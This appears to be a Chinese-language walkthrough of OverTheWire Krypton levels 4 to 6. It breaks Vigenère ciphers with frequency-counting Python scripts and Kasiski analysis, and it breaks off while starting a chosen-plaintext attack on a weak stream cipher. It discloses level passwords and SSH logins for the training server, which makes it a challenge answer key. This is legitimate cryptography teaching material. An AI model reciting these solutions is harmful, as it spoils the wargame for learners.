RVVKP BHZXI YLYZP DLCDI IKGFJ UXRIP TFQGL CWVXR IEZRV NMYSF JDLCL RXOWJ NMINX FNJSP JGHVV ERJTT OOHRM VMBWN JTXKG JJJXY TSYKL OQZFT OSRFN JKBIY YSSHE LIKLO RFJGS VMRJC CYTCS VHDLC LRXOJ MWFYB JPNVR NWUMZ GRVMF UPOEB XKSDL CBZGU IBBZX MLMKK LOACX KECOC IUSBS RMPXR IPJZW XSPTR HKRQB VVOHR MVKEE PIZEX SDYYI QERJJ RYSLJ VZOVU NJLOW RTXSD LYYNE ILMBK LORYW VAOXM KZRNL CWZRA YGWVH DLCLZ VVXFF KASPJ GVIKW WWVTV MCIKL OQYSW SBAFJ EWRII SFACC MZRVO MLYYI MSSSK VISDY YIGML PZICW FJNMV PDNEH ISSFE HWEIJ PSEEJ QYIBW JFMIC TCWYE ZWLTK WKMBY YICGY WVGBS UKFVG IKJRR DSBJJ XBSWM VVYLR MRXSW BNWJO VCSKW KMBYY IQYYW UMKRM KKLOK YYVWX SMSVL KWCAV VNIQY ISIIB MVVLI DTIIC SGSRX EVYQC CDLMZ XLDWF JNSEP BRROO WJFMI CSDDF YKWQM VLKWM KKLOV CXKFE XRFBI MEPJW SBWFJ ZWGMA PVHKR BKZIB GCFEH WEWSF XKPJT NCYYR TUICX PTPLO VIJVT DSRMV AOWRB YIBIR MVWER QJKWK RBDFY MELSF XPEGQ KSPML IYIBX FJPXR ELPVH RMKFE HLEBJ YMWKM TUFII YSUXE VLJUX YAYWU XRIUJ JXGEJ PZRQS TJIJS IJIJS PWMKK KBEQX USDXC IYIBI YSUXR IPJNM DLBFZ WSIQF EHLYR YVVMY NXUSB SRMPW DMJQN SBIRM VTBIR YPWSP IIIIC WQMVL KHNZK SXMLY YIZEJ FTILY RSFAD SFJIW EVNWZ WOWFJ WSERB NKAKW LTCSX KCWXV OILGL XZYPJ NLSXC YYIBM ZGFRK VMZEH DSRTJ ROGIM RHKPQ TCSCX GYJKB ICSTS VSPFE HGEQF JARMR JRWNS PTKLI WBWVW CXFJV QOVYQ UGSXW BRWCS MSCIP XDFIF OLGSU ECXFJ PENZY STINX FJXVY YLISI MEKJI SEKFJ IEXHF NCPSI PKFVD LCWVA OVCSF JKVKX ESBLM ZJICM LYYMC GMZEX BCMKK LOACX KEXHR MVKBS SSUAK WSSKM VPCIZ RDLCF WXOVL TFRDL CXLRC LMSVL YXGSK LOMPK RGOWD TIXRI PJNIB ILTKV OIQYF SPJCW KLOQQ MRHOW MYYED FCKFV ORGLY XNSPT KLIEL $ cat found2 YYIIA CWVSL PGLVH DSAFD TYYRY YEDRG LYXER BJIEV EPLVX BICNE XRIDT IICXD TIXRI PJNIB ILTYS EWCXE IKVRM VXBIC RRHOE ETFHD LGHBG YZCWZ RQXMU ISDIA YKLOQ DWFQD LCIVA KRBYY IDMLB FSNQY STLYT NJUEQ VCFKT SPCTW AYSBB ZXRLG XRBOE LIUSB SRMPF EMJYR WZPCS UMNJG WVXRE RBRVW IBMVV KRBRR HOLCW WIOPJ JJWVS LJCCC LCFEH DSRTR XOXFJ CECXM KKLOM PGIIK HYSUR YAQMV HSHLT KOXSU BYEDX FJPAY YJIUS PSPGI IKODF JXSJW TLASW FXRMN XFJCM YRGBZ PVKMN EXYXF JWSBI QYRRN OGQCE NICWW SBCMZ PSEGY SISKW RNKFI XFJWM BIQNE GOCMZ IXKWR JJEBI QTGIM YJNRV DLYYP SETPJ WIBGM TBINJ MTUEX HRMVR ISSBZ PVLYA VEFIP DXSYH ZWVEU JYXKH YRRUC IKWCI FRDFC LXINX FJKMX AMTUQ KRGXY SEPBH VVDEG SCCGI CUZJI SSPZP VIBFG SYVBJ VVKRB YYIXQ WORAC AMZCH BYQYR KKMLG LXDLC QZSXA CSKEG EWNEX YXFJW SBIQY RRNJM ZEHRM QTNRC YNUVV KRBSF SXICA VVURC BNLKX GYNEC JMWYI NMBSK QORRN FRSXY SUXRI QHRVO GPTNJ YYLIR XBICK LPVSD SLXCE LIWMV PCIUS BSRMP WLEQP VXGMR MKLOQ QTKLK XQMVA YYJIE SDFCM LRQVW KFVKP MSXXS QCXYI DLMZX LDXFN JAKWT JICUM LIRRN XFTLK RXDZC SPXFJ JGKVC HISGF SYJLO PYZXL OHFJR VDMJD RXDLC FNOGE PINEI MLBYM MLRMV TYSPH IIKXS WVTSG IJUYZ XFJEY DWFNJ TKHBJ ULKRB XNIBI QTTPE QQDRR NXFJE YDWUJ IICSQ RRPVX FFKLO HPTGT OHYQD SCXYX DEXCY XYIZY RNEXR IZFJO OXZZK XRIQH RVOGP TNHSH LTKQS RBMFA VSLLZ XDSMP YMWXM KZPVX FJSEC OCYWS BMRJE ELPCI YMWXM PVIZE UFPJB SKYYI PMPJR WRIDJ RVOHY XGEBO KNXLD KCYZR DSFNJ WDVYB RRNFS WELSQ SUJSR IIJGX KKMTU HSWRF EGOEU FPJBS KYYIP PYRVW KRBTE PIGYR VROEP YFGYZ CWUSB SRMPA SXFII CVIYA VWGLC SJLOP YDUSG RRTJP OINYY ICIIJ GXRIP AVVIW LZXEX HUFIQ KRBXY ICPCU KWYYL ICCER RNCQY VLNEK GLCSZ XGEQI RCVME MKXRI ENIPL ERMVH RIPKR GOMLF CMDXJ JIMZT JNEKL VMTBE XHQTF RKJRJ IXRIW FCPCX YWKIN XMBRV NXFJV QOVYQ UGSXW YYMCA YXKSL IYSVZ ORRKL PNEWK FVDLC YIEFI JJIWD LCDYE NLYWU PIFCJ EAKPI NEKKR FTLVG LCSKL OCQFN FOJMW VXRIK FXVOE RIZXM LRMRX MVMXJ INXFJ ISKHY SUHSZ GIVHD LCKFV OWRFJ JKVYX KLOCA TLPNW CJFRO MRMVV CMBJZ XGEQF MIBCU NUINM RHYEX HUMVR DLCDT VOTRZ GXYXF JVHQI YSUPY SIJUM XXMNK XRIWH FYVHQ JVMDA YXRPC STJIC NICUR RNXFJ IIGIP JDEXC ZNXNK KEJUV YGIXR XDLCG FXDSK YYICM BJJAO VCXFW DICUK LKXLT EIYJR MVQMS SQUGV MKGUS GRYSU JYVYR FQORR NKWOI KJUXR ERYYI SVHTL VXIWR LWDIL INLKX QMRPV ACIFE COCIU SBSRM PHOWN FZVSR EQPMR ETJEX DLCKR MXXCX KMNIY XRMNX FJKMX AMTUQ KRYSU XRIJN FRCLM TBLSW QMRKQ CKFEI KRBQF SUIBY YSEKF YWYVF SYKLO WAFII MVMBJ ESHUJ TEXRM YWPIX FFKMC GCWKE SRLJZ XRIPH RRGIA QZQLH MBEMX XMYYM CKPJR XNMRH YXRIP JWSBI GKNIM ELSFX TYKUF ZOVGY NIWYQ YJXYT UMVVO ACFII SXFNE OSGMZ CHTYK UFZOV GYJES HRMVG YAYWU PIPGT EEPXC WDIKW SWZRQ XFJUM CXYST IMEPJ WYVPW NELSW KNEHD LCSNI KVCFC PBMEM KEXWU JIINX FJJGK VCHIS GJMWP SEGYS TEBVW ZJEVP MAVVY RWTLV LEAPF ROERF KMWIU JCPSP JYICS XQFZH DLCQZ SXAFT NMVPE TWMBW RNNMV PBJTP KVCIK LOWAF IIMVM BWSBM DDFYP SSSUX RERDF YMSSQ URYXH ZDTYZ CWKLO KSQWH YVMYY CGSSQ UFOOG QCINS PYYID MLBFS NQYSS ENPWI VRDIB TEXRI PTTOC FCQFA LYRNW MKQMS PSEVZ FTOSX UNCPX SRRRX DIPXF QEGFK FVDLC KRPVA MZCHX SRMLV DQCFK EVP $ mktemp -d /tmp/tmp.uG3ytoUtVo $ cd /tmp/tmp.uG3ytoUtVo $ cp /krypton/krypton4/found* . $ vi count.py \u6309\u5bc6\u94a5\u957f\u5ea6\u5206\u522b\u7edf\u8ba1\u5404\u4e2a\u4f4d\u4e0a\u7684\u5b57\u6bcd\u9891\u7387\uff0c\u4e00\u822c\u6700\u9ad8\u9891\u7387\u5b57\u6bcd\u5bf9\u5e94\u660e\u6587 E \uff0c\u7531\u6b64\u53ef\u63a8\u51fa\u5bc6\u94a5 \u9700\u8981\u6ce8\u610f found1 \u7684\u957f\u5ea6\u4e0d\u662f 6 \u7684\u500d\u6570\uff0c\u4e0d\u80fd\u76f4\u63a5\u4e0e found2 \u62fc\u63a5\u540e\u8ba1\u7b97 count.py 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 #!/usr/bin/env python3 for i in range ( 1 , 3 ): s = '' with open ( 'found' + str ( i ), 'r' ) as f : s += f . read () s = s . replace ( ' ' , '' ) d = list ( dict () for _ in range ( 6 )) cnt = list ( 0 for _ in range ( 6 )) for i in range ( len ( s )): cnt [ i % 6 ] += 1 try : d [ i % 6 ][ s [ i ]] += 1 except : d [ i % 6 ][ s [ i ]] = 1 key = '' for i in range ( 6 ): for j in d [ i ]: d [ i ][ j ] /= cnt [ i ] d [ i ] = sorted ( d [ i ] . items (), key = lambda kv :( kv [ 1 ], kv [ 0 ]), reverse = True ) key += chr (( 26 + ord ( d [ i ][ 0 ][ 0 ]) - ord ( 'E' )) % 26 + ord ( 'A' )) print ( key ) 1 2 $ python3 count.py FRTKEY \u5728\u6587\u672c\u957f\u5ea6\u4e0d\u591f\u7684\u60c5\u51b5\u4e0b\uff0c\u5b9e\u9645\u5b57\u6bcd\u9891\u7387\u4f1a\u6709\u4e00\u5b9a\u7684\u504f\u5dee\uff0c\u6b64\u65f6\u9700\u6839\u636e\u89e3\u5bc6\u60c5\u51b5\u5e76\u7ed3\u5408\u5e38\u7528\u8bcd\u5bf9\u5bc6\u94a5\u8fdb\u884c\u8c03\u6574 found1 \u4e0e found2 \u5747\u4ee5 YYI \u5f00\u5934\uff0c\u63a8\u6d4b YYI \u5bf9\u5e94\u660e\u6587 THE \uff0c\u8c03\u6574\u5bc6\u94a5\u4e3a FREKEY HCIKV RJOX \u89e3\u5bc6\u4e3a CLEAR TEXT Level 5 \u00b6 Username krypton5 Password CLEARTEXT 1 2 3 4 5 6 7 8 9 10 11 12 13 $ ssh krypton5@krypton.labs.overthewire.org -p 2231 $ cd /krypton/krypton5 $ ls found1 found2 found3 krypton6 README $ cat README Frequency analysis can break a known key length as well. Lets try one last polyalphabetic cipher, but this time the key length is unknown. Enjoy. $ cat krypton6 BELOS Z \u7531\u4e8e\u5bc6\u94a5\u957f\u5ea6\u672a\u77e5\uff0c\u9996\u5148\u8981\u63a8\u6d4b\u5bc6\u94a5\u957f\u5ea6\uff0c\u901a\u8fc7 Kasiski \u6d4b\u8bd5 \u6765\u5224\u65ad \u5728\u7ef4\u5409\u5c3c\u4e9a\u52a0\u5bc6\u4e2d\uff0c\u5f53\u660e\u6587\u4e2d\u4e00\u5bf9\u76f8\u540c\u5b57\u6bcd\u7ec4\u95f4\u9694\u5b57\u6bcd\u6570\u4e3a\u5bc6\u94a5\u7684\u500d\u6570\u65f6\uff0c\u5176\u5bf9\u5e94\u7684\u5bc6\u6587\u5b57\u6bcd\u7ec4\u76f8\u540c \u5206\u522b\u5206\u6790 found1 \u3001 found2 \u548c found3 \uff0c\u63a8\u6d4b\u5bc6\u94a5\u957f\u5ea6\u4e3a \\(3\\) \u9700\u8981\u6ce8\u610f Key Length \u662f\u5de5\u5177\u5904\u7406\u540e\u7684\u7ed3\u679c\uff0c\u5b9e\u9645\u5b57\u6bcd\u7ec4\u95f4\u9694\u5747\u5927\u4e8e \\(3\\) File Key Length Distances Matched found1 3 84.18 % found2 3 83.19 % found3 3 78.40 % \u518d\u4f7f\u7528 Level 4 \u7684\u811a\u672c\u5206\u6790\uff0c\u6253\u5370\u8f93\u51fa\u5404\u4e2a\u4f4d\u7684\u5b57\u6bcd\u9891\u7387\uff0c\u53d1\u73b0\u4e0e\u5b57\u6bcd\u9891\u7387\u8868\u4e2d\u7684\u503c\u5dee\u8ddd\u8f83\u5927 count.py 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 #!/usr/bin/env python3 kl = 3 for i in range ( 1 , 4 ): s = '' with open ( 'found' + str ( i ), 'r' ) as f : s += f . read () s = s . replace ( ' ' , '' ) d = list ( dict () for _ in range ( kl )) cnt = list ( 0 for _ in range ( kl )) for i in range ( len ( s )): cnt [ i % kl ] += 1 try : d [ i % kl ][ s [ i ]] += 1 except : d [ i % kl ][ s [ i ]] = 1 for i in range ( kl ): for j in d [ i ]: d [ i ][ j ] /= cnt [ i ] d [ i ] = sorted ( d [ i ] . items (), key = lambda kv :( kv [ 1 ], kv [ 0 ]), reverse = True ) print ( d [ i ]) 1 2 3 4 $ python3 count.py [( 'K' , 0 .08347529812606473 ) , ( 'Y' , 0 .07836456558773425 ) , ( 'O' , 0 .07155025553662692 ) , ( 'D' , 0 .06132879045996593 ) , ( 'P' , 0 .05792163543441227 ) , ( 'C' , 0 .05792163543441227 ) , ( 'S' , 0 .05110732538330494 ) , ( 'T' , 0 .049403747870528106 ) , ( 'Z' , 0 .04599659284497445 ) , ( 'X' , 0 .04599659284497445 ) , ( 'R' , 0 .04599659284497445 ) , ( 'N' , 0 .044293015332197615 ) , ( 'G' , 0 .039182282793867124 ) , ( 'E' , 0 .039182282793867124 ) , ( 'U' , 0 .030664395229982964 ) , ( 'L' , 0 .030664395229982964 ) , ( 'B' , 0 .02555366269165247 ) , ( 'W' , 0 .020442930153321975 ) , ( 'V' , 0 .020442930153321975 ) , ( 'M' , 0 .017035775127768313 ) , ( 'J' , 0 .017035775127768313 ) , ( 'I' , 0 .017035775127768313 ) , ( 'A' , 0 .017035775127768313 ) , ( 'Q' , 0 .013628620102214651 ) , ( 'F' , 0 .013628620102214651 ) , ( 'H' , 0 .005110732538330494 )] [( 'I' , 0 .09215017064846416 ) , ( 'X' , 0 .08191126279863481 ) , ( 'M' , 0 .07679180887372014 ) , ( 'E' , 0 .06825938566552901 ) , ( 'L' , 0 .06484641638225255 ) , ( 'S' , 0 .06143344709897611 ) , ( 'V' , 0 .059726962457337884 ) , ( 'H' , 0 .05460750853242321 ) , ( 'W' , 0 .04778156996587031 ) , ( 'T' , 0 .04778156996587031 ) , ( 'R' , 0 .04436860068259386 ) , ( 'G' , 0 .03924914675767918 ) , ( 'P' , 0 .03754266211604096 ) , ( 'B' , 0 .034129692832764506 ) , ( 'K' , 0 .030716723549488054 ) , ( 'A' , 0 .027303754266211604 ) , ( 'Y' , 0 .023890784982935155 ) , ( 'J' , 0 .023890784982935155 ) , ( 'Z' , 0 .017064846416382253 ) , ( 'O' , 0 .017064846416382253 ) , ( 'F' , 0 .015358361774744027 ) , ( 'C' , 0 .015358361774744027 ) , ( 'D' , 0 .006825938566552901 ) , ( 'N' , 0 .005119453924914676 ) , ( 'U' , 0 .0034129692832764505 ) , ( 'Q' , 0 .0034129692832764505 )] [( 'Y' , 0 .07337883959044368 ) , ( 'L' , 0 .07167235494880546 ) , ( 'R' , 0 .059726962457337884 ) , ( 'P' , 0 .05802047781569966 ) , ( 'V' , 0 .05631399317406143 ) , ( 'F' , 0 .051194539249146756 ) , ( 'A' , 0 .04948805460750853 ) , ( 'U' , 0 .04607508532423208 ) , ( 'S' , 0 .04607508532423208 ) , ( 'C' , 0 .04607508532423208 ) , ( 'G' , 0 .042662116040955635 ) , ( 'Q' , 0 .03924914675767918 ) , ( 'M' , 0 .03924914675767918 ) , ( 'B' , 0 .03924914675767918 ) , ( 'K' , 0 .03583617747440273 ) , ( 'Z' , 0 .034129692832764506 ) , ( 'N' , 0 .034129692832764506 ) , ( 'J' , 0 .034129692832764506 ) , ( 'H' , 0 .02901023890784983 ) , ( 'O' , 0 .027303754266211604 ) , ( 'E' , 0 .025597269624573378 ) , ( 'W' , 0 .017064846416382253 ) , ( 'T' , 0 .015358361774744027 ) , ( 'I' , 0 .011945392491467578 ) , ( 'D' , 0 .011945392491467578 ) , ( 'X' , 0 .005119453924914676 )] \u8c03\u6574\u5bc6\u94a5\u957f\u5ea6\u4e3a \\(3\\) \u7684\u500d\u6570\uff0c\u5f53\u5bc6\u94a5\u957f\u5ea6\u4e3a \\(9\\) \u65f6\uff0c\u53ef\u4ee5\u83b7\u5f97\u8f83\u4e3a\u5408\u7406\u7684\u5b57\u6bcd\u9891\u7387\uff0c\u660e\u6587\u5b57\u6bcd E \u4e00\u822c\u5bf9\u5e94\u9891\u7387\u9760\u524d\u7684\u5bc6\u6587\u5b57\u6bcd\uff0c\u5bc6\u94a5\u4e3a KEYLENGTH 1 2 3 4 5 6 7 8 9 10 $ python3 count.py [( 'C' , 0 .12244897959183673 ) , ( 'O' , 0 .11224489795918367 ) , ( 'K' , 0 .09693877551020408 ) , ( 'D' , 0 .09183673469387756 ) , ( 'Y' , 0 .08163265306122448 ) , ( 'R' , 0 .07142857142857142 ) , ( 'S' , 0 .0663265306122449 ) , ( 'B' , 0 .061224489795918366 ) , ( 'X' , 0 .04591836734693878 ) , ( 'V' , 0 .03571428571428571 ) , ( 'P' , 0 .030612244897959183 ) , ( 'N' , 0 .030612244897959183 ) , ( 'E' , 0 .025510204081632654 ) , ( 'F' , 0 .02040816326530612 ) , ( 'W' , 0 .015306122448979591 ) , ( 'Q' , 0 .015306122448979591 ) , ( 'M' , 0 .015306122448979591 ) , ( 'L' , 0 .015306122448979591 ) , ( 'Z' , 0 .01020408163265306 ) , ( 'U' , 0 .01020408163265306 ) , ( 'I' , 0 .01020408163265306 ) , ( 'G' , 0 .01020408163265306 ) , ( 'A' , 0 .00510204081632653 )] [( 'I' , 0 .11734693877551021 ) , ( 'S' , 0 .10204081632653061 ) , ( 'X' , 0 .08163265306122448 ) , ( 'W' , 0 .08163265306122448 ) , ( 'V' , 0 .08163265306122448 ) , ( 'M' , 0 .07653061224489796 ) , ( 'E' , 0 .07142857142857142 ) , ( 'R' , 0 .0663265306122449 ) , ( 'L' , 0 .061224489795918366 ) , ( 'H' , 0 .03571428571428571 ) , ( 'J' , 0 .030612244897959183 ) , ( 'Y' , 0 .025510204081632654 ) , ( 'T' , 0 .025510204081632654 ) , ( 'P' , 0 .025510204081632654 ) , ( 'F' , 0 .025510204081632654 ) , ( 'K' , 0 .02040816326530612 ) , ( 'G' , 0 .015306122448979591 ) , ( 'C' , 0 .015306122448979591 ) , ( 'A' , 0 .015306122448979591 ) , ( 'Z' , 0 .01020408163265306 ) , ( 'O' , 0 .01020408163265306 ) , ( 'Q' , 0 .00510204081632653 )] [( 'Y' , 0 .10204081632653061 ) , ( 'C' , 0 .10204081632653061 ) , ( 'L' , 0 .09693877551020408 ) , ( 'R' , 0 .09183673469387756 ) , ( 'Q' , 0 .08673469387755102 ) , ( 'M' , 0 .08163265306122448 ) , ( 'P' , 0 .061224489795918366 ) , ( 'F' , 0 .061224489795918366 ) , ( 'G' , 0 .05102040816326531 ) , ( 'J' , 0 .04591836734693878 ) , ( 'K' , 0 .03571428571428571 ) , ( 'A' , 0 .03571428571428571 ) , ( 'S' , 0 .025510204081632654 ) , ( 'B' , 0 .025510204081632654 ) , ( 'U' , 0 .02040816326530612 ) , ( 'I' , 0 .02040816326530612 ) , ( 'Z' , 0 .01020408163265306 ) , ( 'T' , 0 .01020408163265306 ) , ( 'N' , 0 .01020408163265306 ) , ( 'E' , 0 .01020408163265306 ) , ( 'W' , 0 .00510204081632653 ) , ( 'V' , 0 .00510204081632653 ) , ( 'D' , 0 .00510204081632653 )] [( 'P' , 0 .14285714285714285 ) , ( 'D' , 0 .09183673469387756 ) , ( 'Y' , 0 .08673469387755102 ) , ( 'T' , 0 .0663265306122449 ) , ( 'E' , 0 .0663265306122449 ) , ( 'S' , 0 .061224489795918366 ) , ( 'L' , 0 .061224489795918366 ) , ( 'Z' , 0 .05102040816326531 ) , ( 'N' , 0 .05102040816326531 ) , ( 'W' , 0 .04591836734693878 ) , ( 'O' , 0 .04591836734693878 ) , ( 'X' , 0 .03571428571428571 ) , ( 'C' , 0 .030612244897959183 ) , ( 'Q' , 0 .025510204081632654 ) , ( 'J' , 0 .025510204081632654 ) , ( 'R' , 0 .02040816326530612 ) , ( 'F' , 0 .02040816326530612 ) , ( 'A' , 0 .02040816326530612 ) , ( 'V' , 0 .015306122448979591 ) , ( 'M' , 0 .015306122448979591 ) , ( 'I' , 0 .00510204081632653 ) , ( 'H' , 0 .00510204081632653 ) , ( 'G' , 0 .00510204081632653 ) , ( 'B' , 0 .00510204081632653 )] [( 'I' , 0 .1282051282051282 ) , ( 'E' , 0 .09230769230769231 ) , ( 'S' , 0 .08205128205128205 ) , ( 'M' , 0 .07692307692307693 ) , ( 'X' , 0 .06153846153846154 ) , ( 'V' , 0 .06153846153846154 ) , ( 'H' , 0 .06153846153846154 ) , ( 'P' , 0 .05641025641025641 ) , ( 'L' , 0 .05128205128205128 ) , ( 'W' , 0 .046153846153846156 ) , ( 'R' , 0 .046153846153846156 ) , ( 'J' , 0 .041025641025641026 ) , ( 'O' , 0 .035897435897435895 ) , ( 'G' , 0 .03076923076923077 ) , ( 'C' , 0 .03076923076923077 ) , ( 'A' , 0 .02564102564102564 ) , ( 'Y' , 0 .020512820512820513 ) , ( 'T' , 0 .015384615384615385 ) , ( 'K' , 0 .010256410256410256 ) , ( 'F' , 0 .010256410256410256 ) , ( 'Z' , 0 .005128205128205128 ) , ( 'Q' , 0 .005128205128205128 ) , ( 'B' , 0 .005128205128205128 )] [( 'V' , 0 .09743589743589744 ) , ( 'R' , 0 .08205128205128205 ) , ( 'B' , 0 .08205128205128205 ) , ( 'G' , 0 .07692307692307693 ) , ( 'N' , 0 .06666666666666667 ) , ( 'F' , 0 .06666666666666667 ) , ( 'E' , 0 .06153846153846154 ) , ( 'Y' , 0 .05641025641025641 ) , ( 'U' , 0 .05128205128205128 ) , ( 'A' , 0 .05128205128205128 ) , ( 'S' , 0 .041025641025641026 ) , ( 'P' , 0 .035897435897435895 ) , ( 'J' , 0 .035897435897435895 ) , ( 'Z' , 0 .03076923076923077 ) , ( 'Q' , 0 .03076923076923077 ) , ( 'O' , 0 .020512820512820513 ) , ( 'L' , 0 .020512820512820513 ) , ( 'C' , 0 .020512820512820513 ) , ( 'X' , 0 .015384615384615385 ) , ( 'T' , 0 .015384615384615385 ) , ( 'H' , 0 .015384615384615385 ) , ( 'I' , 0 .010256410256410256 ) , ( 'W' , 0 .005128205128205128 ) , ( 'K' , 0 .005128205128205128 ) , ( 'D' , 0 .005128205128205128 )] [( 'K' , 0 .15384615384615385 ) , ( 'G' , 0 .10256410256410256 ) , ( 'U' , 0 .08205128205128205 ) , ( 'T' , 0 .08205128205128205 ) , ( 'Z' , 0 .07692307692307693 ) , ( 'Y' , 0 .06666666666666667 ) , ( 'X' , 0 .05641025641025641 ) , ( 'O' , 0 .05641025641025641 ) , ( 'N' , 0 .05128205128205128 ) , ( 'R' , 0 .046153846153846156 ) , ( 'I' , 0 .035897435897435895 ) , ( 'S' , 0 .02564102564102564 ) , ( 'J' , 0 .02564102564102564 ) , ( 'E' , 0 .02564102564102564 ) , ( 'A' , 0 .02564102564102564 ) , ( 'M' , 0 .020512820512820513 ) , ( 'C' , 0 .020512820512820513 ) , ( 'L' , 0 .015384615384615385 ) , ( 'V' , 0 .010256410256410256 ) , ( 'H' , 0 .010256410256410256 ) , ( 'B' , 0 .010256410256410256 )] [( 'X' , 0 .10256410256410256 ) , ( 'T' , 0 .10256410256410256 ) , ( 'B' , 0 .09743589743589744 ) , ( 'L' , 0 .08205128205128205 ) , ( 'M' , 0 .07692307692307693 ) , ( 'G' , 0 .07179487179487179 ) , ( 'H' , 0 .06666666666666667 ) , ( 'K' , 0 .06153846153846154 ) , ( 'E' , 0 .041025641025641026 ) , ( 'A' , 0 .041025641025641026 ) , ( 'Z' , 0 .035897435897435895 ) , ( 'V' , 0 .035897435897435895 ) , ( 'P' , 0 .03076923076923077 ) , ( 'I' , 0 .03076923076923077 ) , ( 'Y' , 0 .02564102564102564 ) , ( 'R' , 0 .020512820512820513 ) , ( 'D' , 0 .020512820512820513 ) , ( 'W' , 0 .015384615384615385 ) , ( 'N' , 0 .015384615384615385 ) , ( 'U' , 0 .010256410256410256 ) , ( 'F' , 0 .010256410256410256 ) , ( 'O' , 0 .005128205128205128 )] [( 'L' , 0 .09743589743589744 ) , ( 'P' , 0 .07692307692307693 ) , ( 'S' , 0 .07179487179487179 ) , ( 'H' , 0 .07179487179487179 ) , ( 'V' , 0 .06666666666666667 ) , ( 'U' , 0 .06666666666666667 ) , ( 'K' , 0 .06666666666666667 ) , ( 'Z' , 0 .06153846153846154 ) , ( 'Y' , 0 .06153846153846154 ) , ( 'O' , 0 .06153846153846154 ) , ( 'A' , 0 .06153846153846154 ) , ( 'W' , 0 .041025641025641026 ) , ( 'M' , 0 .035897435897435895 ) , ( 'N' , 0 .02564102564102564 ) , ( 'F' , 0 .02564102564102564 ) , ( 'D' , 0 .02564102564102564 ) , ( 'T' , 0 .020512820512820513 ) , ( 'J' , 0 .020512820512820513 ) , ( 'C' , 0 .015384615384615385 ) , ( 'B' , 0 .010256410256410256 ) , ( 'R' , 0 .005128205128205128 ) , ( 'I' , 0 .005128205128205128 ) , ( 'E' , 0 .005128205128205128 )] \u89e3 BELOS Z \u5f97 RANDO M Level 6 \u00b6 Username krypton6 Password RANDOM 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 $ ssh krypton6@krypton.labs.overthewire.org -p 2231 $ cd /krypton/krypton6 $ ls encrypt6 HINT1 HINT2 keyfile.dat krypton7 onetime README $ cat README Hopefully by now its obvious that encryption using repeating keys is a bad idea. Frequency analysis can destroy repeating/fixed key substitution crypto. A feature of good crypto is random ciphertext. A good cipher must not reveal any clues about the plaintext. Since natural language plaintext ( in this case , English ) contains patterns, it is left up to the encryption key or the encryption algorithm to add the 'randomness' . Modern ciphers are similar to older plain substitution ciphers, but improve the 'random' nature of the key. An example of an older cipher using a complex, random, large key is a vigniere using a key of the same size of the plaintext. For example, imagine you and your confident have agreed on a key using the book 'A Tale of Two Cities' as your key, in 256 byte blocks. The cipher works as such: Each plaintext message is broken into 256 byte blocks. For each block of plaintext, a corresponding 256 byte block from the book is used as the key, starting from the first chapter, and progressing. No part of the book is ever re-used as key. The use of a key of the same length as the plaintext, and only using it once is called a \"One Time Pad\" . Look in the krypton6/onetime directory. You will find a file called 'plain1' , a 256 byte block. You will also see a file 'key1' , the first 256 bytes of 'A Tale of Two Cities' . The file 'cipher1' is the cipher text of plain1. As you can see ( and try ) it is very difficult to break the cipher without the key knowledge. ( NOTE - it is possible though. Using plain language as a one time pad key has a weakness. As a secondary challenge, open README in that directory ) If the encryption is truly random letters, and only used once, then it is impossible to break . A truly random \"One Time Pad\" key cannot be broken. Consider intercepting a ciphertext message of 1000 bytes. One could brute force for the key, but due to the random key nature, you would produce every single valid 1000 letter plaintext as well. Who is to know which is the real plaintext?!? Choosing keys that are the same size as the plaintext is impractical. Therefore, other methods must be used to obscure ciphertext against frequency analysis in a simple substitution cipher. The impracticality of an 'infinite' key means that the randomness, or entropy, of the encryption is introduced via the method. We have seen the method of 'substitution' . Even in modern crypto, substitution is a valid technique. Another technique is 'transposition' , or swapping of bytes. Modern ciphers break into two types ; symmetric and asymmetric. Symmetric ciphers come in two flavours: block and stream. Until now, we have been playing with classical ciphers, approximating 'block' ciphers. A block cipher is done in fixed size blocks ( suprise! ) . For example, in the previous paragraphs we discussed breaking text and keys into 256 byte blocks, and working on those blocks. Block ciphers use a fixed key to perform substituion and transposition ciphers on each block discretely. Its time to employ a stream cipher. A stream cipher attempts to create an on-the-fly 'random' keystream to encrypt the incoming plaintext one byte at a time. Typically, the 'random' key byte is xor 'd with the plaintext to produce the ciphertext. If the random keystream can be replicated at the recieving end, then a further xor will produce the plaintext once again. From this example forward, we will be working with bytes, not ASCII text, so a hex editor/dumper like hexdump is a necessity. Now is the right time to start to learn to use tools like cryptool. In this example, the keyfile is in your directory, however it is not readable by you. The binary ' encrypt6 ' is also available. It will read the keyfile and encrypt any message you desire, using the key AND a ' random ' number. You get to perform a ' known ciphertext ' attack by introducing plaintext of your choice. The challenge here is not simple, but the ' random ' number generator is weak. As stated, it is now that we suggest you begin to use public tools, like cryptool, to help in your analysis. You will most likely need a hint to get going. See ' HINT1 ' if you need a kickstart. If you have further difficulty, there is a hint in ' HINT2 '. The password for level 7 (krypton7) is encrypted with ' encrypt6 ' . Good Luck! \u6d41\u5bc6\u7801\uff0c\u53ef\u4ee5\u91c7\u7528\u9009\u62e9\u660e\u6587\u653b\u51fb\uff0c\u5f31\u968f\u673a\u6570\u751f\u6210\u5668\uff0c\u5efa\u8bae\u4f7f\u7528\u5f00\u6e90\u5de5\u5177\uff08\u5982 cryptool \uff09\u8f85\u52a9\u5206\u6790\u3002 1 2 3 4 5 6 7 8 9 10 11 $ mktemp -d /tmp/tmp.dUnxjQOLqJ $ cd /tmp/tmp.dUnxjQOLqJ $ ln -s /krypton/krypton6/encrypt6 $ ln -s /krypton/krypton6/keyfile.dat $ chmod 777 . $ ./encrypt6 usage: encrypt6 foo bar Where: foo is the file containing the plaintext and bar is the destination ciphertext file. $ cat /krypton/krypton6/krypton7 PNUKLYLWRQKGKBE encrypt6 \u4e0d\u5904\u7406\u82f1\u6587\u5b57\u6bcd\u4ee5\u5916\u7684\u5b57\u7b26 1 2 3 4 $ echo -n '!#$%^&*()Aa' > plain $ ./encrypt6 plain cipher $ cat cipher EI \u9996\u5148\u83b7\u53d6\u4f2a\u968f\u673a\u5e8f\u5217\u7684\u5468\u671f 1 2 3 4 $ for i in $( seq 1 64 ) ; do echo -n A 